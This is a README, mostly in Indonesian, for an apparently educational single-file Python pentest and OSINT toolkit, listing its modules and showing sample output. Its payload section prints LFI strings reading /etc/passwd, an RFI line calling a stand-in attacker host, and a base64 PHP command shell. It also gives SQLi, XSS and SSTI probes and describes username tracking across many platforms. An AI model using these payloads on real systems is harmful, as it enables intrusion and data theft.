# 🛡️ DRGXEL CyberPack v1.0 BETA TEST

<div align="center">

![Python Version](https://img.shields.io/badge/python-3.6%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Termux-orange)
![Status](https://img.shields.io/badge/status-BETA%20TEST-yellow)
![Size](https://img.shields.io/badge/size-single%20file-brightgreen)

**Single-File Python Security MegaTool**  
*Professional Penetration Testing & OSINT Framework*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Documentation](#-documentation) • [License](#-license)

</div>

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Detailed Usage](#-detailed-usage)
- [Module Documentation](#-module-documentation)
- [Screenshots](#-screenshots)
- [System Requirements](#-system-requirements)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Disclaimer](#%EF%B8%8F-disclaimer)
- [License](#-license)
- [Author](#-author)

---

## 🌟 Overview

**DRGXEL CyberPack** adalah framework security testing profesional yang dikemas dalam **satu file Python** tanpa dependensi eksternal. Tool ini dirancang khusus untuk:

- ✅ **Penetration Testing** - Vulnerability scanning & exploitation testing
- ✅ **OSINT (Open Source Intelligence)** - Information gathering & reconnaissance
- ✅ **Network Security** - Network monitoring & DDoS detection
- ✅ **Malware Analysis** - File scanning & forensics
- ✅ **System Auditing** - Device monitoring & process analysis

### 🎯 Why DRGXEL CyberPack?

- 🚀 **Single-File Architecture** - Tidak perlu instalasi kompleks
- 🔧 **Zero Dependencies** - Hanya menggunakan Python built-in modules
- 📱 **Termux Compatible** - Berjalan sempurna di Android (Termux)
- 🎨 **User-Friendly Interface** - CLI dengan color-coded output
- 📊 **Comprehensive Logging** - Activity tracking & report generation
- 🔒 **Educational Purpose** - Pembelajaran security testing yang aman

---

## 🔥 Features

### 📡 [RECONNAISSANCE] - Information Gathering

| # | Module | Description | Status |
|---|--------|-------------|--------|
| 1 | **Recon Scanner** | Ping test, port scanning, subdomain enumeration | ✅ Stable |
| 2 | **Web Vulnerability Scanner** | Mini-Nikto style scanner untuk deteksi path berbahaya | ✅ Stable |
| 3 | **Directory Bruteforce** | Brute force direktori dengan internal wordlist | ✅ Stable |

### 🎯 [ADVANCED TESTING] - Vulnerability Assessment

| # | Module | Description | Status |
|---|--------|-------------|--------|
| 4 | **SQLi Vulnerability Checker** | SQL Injection detection dengan 14+ payloads | ✅ Stable |
| 5 | **XSS Scanner Mini** | Cross-Site Scripting scanner dengan 16+ payloads | ✅ Stable |
| 6 | **Bruteforce Panel Login** | Login panel testing (rate-limited, ethical) | ⚠️ Beta |
| 7 | **API Fuzzer** | API parameter fuzzing dengan 30+ payloads | ✅ Stable |

### 🔎 [OSINT & DARK WEB TOOLS] - Intelligence Gathering

| # | Module | Description | Status |
|---|--------|-------------|--------|
| 8 | **Username OSINT Checker** | Search username di 50+ platform (GitHub, Reddit, dll) | ✅ Stable |
| 9 | **Email Breach Checker** | Check email di breach database (offline mode) | ✅ Stable |
| 10 | **PDF OSINT Toolkit** | PDF forensics: metadata, JS detection, malware scanning | ✅ Stable |

### 🖥️ [SYSTEM & NETWORK] - Security Monitoring

| # | Module | Description | Status |
|---|--------|-------------|--------|
| 11 | **Device Information** | System info: CPU, RAM, storage, kernel | ✅ Stable |
| 12 | **Anti-DDoS Checker** | DDoS detection & connection analysis | ✅ Stable |
| 13 | **Malware Scanner** | Scan file untuk pattern berbahaya | ✅ Stable |
| 14 | **Process Watchdog** | Monitor suspicious processes & network activity | ✅ Stable |
| 15 | **Network Monitor** | Monitor ports, connections, interfaces | ✅ Stable |
| 16 | **Network Stress Test** | Network performance benchmark (safe mode) | ⚠️ Beta |

### 🛠️ [UTILITIES] - Helper Tools

| # | Module | Description | Status |
|---|--------|-------------|--------|
| 17 | **File Metadata Extractor** | Extract metadata dari file (EXIF, hidden data) | ✅ Stable |
| 18 | **Payload Generator** | Generate 100+ payloads untuk testing | ✅ Stable |
| 19 | **DRGXEL SysLog** | Activity logging & report viewer | ✅ Stable |

---

## 💾 Installation

### Method 1: Direct Download (Recommended)

```bash
# Clone repository
git clone https://github.com/DragoniaCompany1/Drgxel-Cybersecurity-Tools
cd Drgxel-Cybersecurity-Tools

# Berikan permission
chmod +x security.py

# Jalankan
python security.py
```
### Method 3: Termux (Android)

```bash
# Update packages
pkg update && pkg upgrade

# Install Python
pkg install python

# Download tool
git clone https://github.com/DragoniaCompany1/Drgxel-Cybersecurity-Tools
cd Drgxel-Cybersecurity-Tools

# Run
python security.py
```

---

## 🚀 Quick Start

### Basic Usage

```bash
# Jalankan tool
python security.py

# Atau jika sudah executable
./security.py
```

### Example Workflows

#### 1. Web Application Testing
```bash
1. Pilih menu [2] - Web Vulnerability Scanner
2. Input: http://target.com
3. Lihat hasil scanning path berbahaya
4. Pilih menu [4] - SQLi Checker
5. Input: http://target.com/page.php?id=1
6. Analisis vulnerability results
```

#### 2. OSINT Investigation
```bash
1. Pilih menu [8] - Username OSINT Checker
2. Input username target
3. Tunggu scanning 50+ platform
4. Save hasil ke file
5. Pilih menu [9] - Email Breach Checker
6. Input email yang ditemukan
7. Check breach status
```

#### 3. PDF Forensics
```bash
1. Pilih menu [10] - PDF OSINT Toolkit
2. Input path file PDF
3. Lihat metadata extraction
4. Check malicious patterns
5. Review risk score
6. Save analysis report
```

---

## 📚 Detailed Usage

### 🔍 Recon Scanner

**Fungsi:** Reconnaissance dasar untuk information gathering

```bash
[MENU 1] Recon Scanner
├── [1] Ping Test
│   └── Test konektivitas ke target
│       Input: IP/domain
│       Output: RTT, packet loss
│
├── [2] Port Scanner
│   └── Scan 15 port umum
│       Common ports: 21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443
│       Output: Open/closed status
│
└── [3] Subdomain Scanner
    └── Enumerate subdomain dengan wordlist
        Wordlist: www, mail, ftp, admin, api, dev, dll (25+ entries)
        Output: Valid subdomains found
```

**Example:**
```
[?] Enter target: example.com
[i] Scanning subdomains...
[✓] Found: www.example.com
[✓] Found: mail.example.com
[✓] Found: api.example.com
```

---

### 🎯 SQLi Vulnerability Checker

**Fungsi:** Deteksi SQL Injection vulnerabilities

**Payload Testing:**
- Basic injection: `'`, `"`, `' OR '1'='1`
- Comment-based: `admin' --`, `admin' #`
- Union-based: `' UNION SELECT NULL--`
- Time-based: `' AND SLEEP(5)--`

**Detection Method:**
- SQL error signatures (18+ patterns)
- Response length comparison
- Server error codes (500)

**Example:**
```
[?] Enter target URL: http://site.com/page.php?id=1
[i] Testing 14 payloads...
[⚠] VULNERABLE: ' OR '1'='1
    Error detected: mysql_fetch_array
[⚠] SUSPICIOUS: ' UNION SELECT NULL--
    Response length changed by 250 bytes
```

---

### 🔎 Username OSINT Checker

**Fungsi:** Search username di berbagai platform

**Platform Coverage (50+):**
- **Social Media:** Twitter, Instagram, TikTok, Facebook, LinkedIn
- **Developer:** GitHub, GitLab, Bitbucket, StackOverflow, HackerRank
- **Creative:** Behance, Dribbble, DeviantArt, 500px
- **Freelance:** Fiverr, Upwork, Patreon
- **Gaming:** Steam, Twitch, Discord
- **Music:** Spotify, SoundCloud, Last.fm

**Example:**
```
[?] Enter username: john_doe
[✓] FOUND on GitHub
    URL: https://github.com/john_doe
[✓] FOUND on Twitter/X
    URL: https://twitter.com/john_doe
[✓] FOUND on Instagram
    URL: https://instagram.com/john_doe

[Statistics]
  Found: 12
  Success rate: 24.0%
```

---

### 📄 PDF OSINT Toolkit

**Fungsi:** Comprehensive PDF analysis & forensics

**Analysis Features:**
1. **Metadata Extraction**
   - Title, Author, Creator, Producer
   - Creation date, Modification date
   - PDF version

2. **JavaScript Detection**
   - `/JavaScript`, `/JS`, `/OpenAction`
   - Malicious script patterns

3. **Content Extraction**
   - Embedded URLs
   - Email addresses
   - Hidden data

4. **Malicious Pattern Detection**
   - AutoOpen, Launch, URI
   - SubmitForm, ImportData
   - EmbeddedFile, RichMedia, Flash

5. **Risk Scoring System**
   - 0-30: Low Risk ✅
   - 31-60: Medium Risk ⚠️
   - 61-100: High Risk ❌

**Example:**
```
[File Information]
  Size: 524,288 bytes (512.00 KB)
  PDF Version: 1.7

[JavaScript Detection]
  ⚠️ Found: /JavaScript
  ⚠️ Found: /OpenAction
  WARNING: PDF contains JavaScript!

[Security Assessment]
  Risk Score: 40/100 - MEDIUM RISK
  Risk factors:
    • Contains JavaScript (HIGH RISK)
    • Contains 2 suspicious patterns
```

---

### 🛠️ Payload Generator

**Fungsi:** Generate payloads untuk security testing

**Payload Types:**

1. **LFI (Local File Inclusion)** - 12 payloads
   ```
   ../../../../../etc/passwd
   ....//....//....//etc/passwd
   %2e%2e%2f%2e%2e%2fetc%2fpasswd
   ```

2. **RFI (Remote File Inclusion)** - 9 payloads
   ```
   http://attacker.com/shell.txt
   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
   ```

3. **SSTI (Server-Side Template Injection)** - 14 payloads
   ```
   {{7*7}}
   ${7*7}
   {{config.items()}}
   ```

4. **XSS (Cross-Site Scripting)** - 15 payloads
   ```
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   ```

5. **SQLi (SQL Injection)** - 17 payloads
6. **Directory Traversal** - 15 payloads
7. **Command Injection** - 17 payloads
8. **XXE (XML External Entity)** - 5 payloads

**Total: 100+ Payloads**

---

## 📸 Screenshots

### Main Menu
```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██╗               ║
║   ██╔══██╗██╔══██╗██╔════╝ ██║  ██║██╔════╝██║               ║
║   ██║  ██║██████╔╝██║  ███╗███████║█████╗  ██║               ║
║   ██║  ██║██╔══██╗██║   ██║╚════██║██╔══╝  ██║               ║
║   ██████╔╝██║  ██║╚██████╔╝     ██║███████╗███████╗          ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝      ╚═╝╚══════╝╚══════╝          ║
║                                                               ║
║              CyberPack v1.0 - Security MegaTool              ║
║                   Single-File Python Edition                  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

═══════════════════ MAIN MENU ═══════════════════════

  [RECONNAISSANCE]
  [1]  Recon Scanner
  [2]  Web Vulnerability Scanner
  [3]  Directory Bruteforce
  ...
```

---

## ⚙️ System Requirements

### Minimum Requirements
- **OS:** Linux, macOS, Android (Termux), Windows WSL
- **Python:** 3.6 or higher
- **RAM:** 256 MB
- **Storage:** 5 MB
- **Network:** Internet connection (untuk beberapa fitur)

### Recommended
- **OS:** Kali Linux, Parrot OS, Ubuntu, Termux
- **Python:** 3.8+
- **RAM:** 512 MB+
- **Storage:** 10 MB+

### Python Built-in Modules Used
```python
os, sys, socket, subprocess, platform, time, re, json, random
datetime, urllib, html.parser, hashlib
```

**No external dependencies required!**

---

## 🗺️ Roadmap

### Version 1.0 BETA TEST (Current)
- ✅ 19 Core modules
- ✅ Single-file architecture
- ✅ OSINT tools integration
- ✅ PDF forensics toolkit
- ✅ Comprehensive logging

### Version 1.1 (Planned)
- [ ] Hash Cracker (MD5, SHA1, SHA256)
- [ ] WiFi Scanner & Analyzer
- [ ] Steganography Detector
- [ ] Domain WHOIS Lookup
- [ ] SSL/TLS Certificate Checker
- [ ] Reverse IP Lookup

### Version 2.0 (Future)
- [ ] GUI Interface (Tkinter)
- [ ] Report Export (PDF, HTML, JSON)
- [ ] Multi-threading support
- [ ] Custom wordlist import
- [ ] Plugin system
- [ ] Database integration

---

## 🤝 Contributing

Kontribusi sangat diterima! Berikut cara berkontribusi:

### How to Contribute

1. **Fork** repository ini
2. **Clone** fork Anda
   ```bash
   git clone https://github.com/yourusername/drgxel-cyberpack.git
   ```
3. **Create branch** untuk fitur baru
   ```bash
   git checkout -b feature/AmazingFeature
   ```
4. **Commit** perubahan Anda
   ```bash
   git commit -m 'Add some AmazingFeature'
   ```
5. **Push** ke branch
   ```bash
   git push origin feature/AmazingFeature
   ```
6. **Open Pull Request**

### Contribution Guidelines

- Ikuti struktur modul yang ada
- Gunakan penanda `### [DRGXEL] MODULE START/END`
- Tambahkan dokumentasi untuk fitur baru
- Test di multiple platform (Linux, Termux)
- Gunakan hanya Python built-in modules

### Code Style

```python
# Good - Following DRGXEL structure
### [DRGXEL] MODULE START: Your Module Name
def your_module_function():
    clear_screen()
    print_banner()
    log_activity("Your module executed")
    # Your code here
### [DRGXEL] MODULE END: Your Module Name
```

---

## ⚠️ Disclaimer

```
╔═══════════════════════════════════════════════════════════════╗
║                        LEGAL NOTICE                           ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║  ⚠️  EDUCATIONAL & AUTHORIZED USE ONLY                       ║
║                                                               ║
║  This tool is for EDUCATIONAL purposes and AUTHORIZED        ║
║  security testing only. You must have explicit permission    ║
║  to test any systems, networks, or applications.             ║
║                                                               ║
║  ❌ DO NOT USE FOR:                                          ║
║     • Unauthorized access or hacking                         ║
║     • Illegal activities or malicious purposes               ║
║     • Testing systems without permission                     ║
║     • Stalking, harassment, or privacy invasion              ║
║     • Any activity that violates laws or regulations         ║
║                                                               ║
║  ✅ LEGAL USE CASES:                                         ║
║     • Penetration testing (authorized)                       ║
║     • Security research & education                          ║
║     • Bug bounty programs                                    ║
║     • Personal system auditing                               ║
║     • CTF competitions                                       ║
║                                                               ║
║  The author and contributors are NOT responsible for any     ║
║  misuse or damage caused by this tool. Users are solely      ║
║  responsible for complying with applicable laws.             ║
║                                                               ║
║  By using this tool, you agree to use it responsibly and     ║
║  ethically. Unauthorized use may result in severe legal      ║
║  consequences.                                                ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```

---

## 📜 License

```
MIT License

Copyright (c) 2024 DRGXEL Team

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 👤 Author

**DRGXEL Team**

- GitHub: [@dragoniacompany1](https://github.com/dragoniacompany1)
- Email: lutpilarsi614@gmail.com
- channel WhatsApp : https://whatsapp.com/channel/0029Vb6i6XmFi8xVkZ7QkO40

---

## 🙏 Acknowledgments

- Inspired by Metasploit Framework
- Thanks to all open-source security tools
- Special thanks to the security research community
- Built with ❤️ for the infosec community

---

## 📞 Support

Jika Anda menemukan bug atau punya saran:

- 🐛 **Report Bug:** [Open an issue](https://wa.me/+855713699182)
- 💡 **Feature Request:** [Request a feature](https://wa.me/+855713699182)
- 📧 **Contact:** lutpilarsi614@gmail.com

---

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/drgxel-cyberpack&type=Date)](https://star-history.com/dragoniacompany1/Drgxel-Cybersecurity-Tools&Date)

---

<div align="center">

**Made with 🔥 by DEXEL SCRIPTER Team**

*Stay Safe, Stay Secure!* 🛡️

[⬆ Back to Top](#-drgxel-cyberpack-v10-beta-test)

</div>
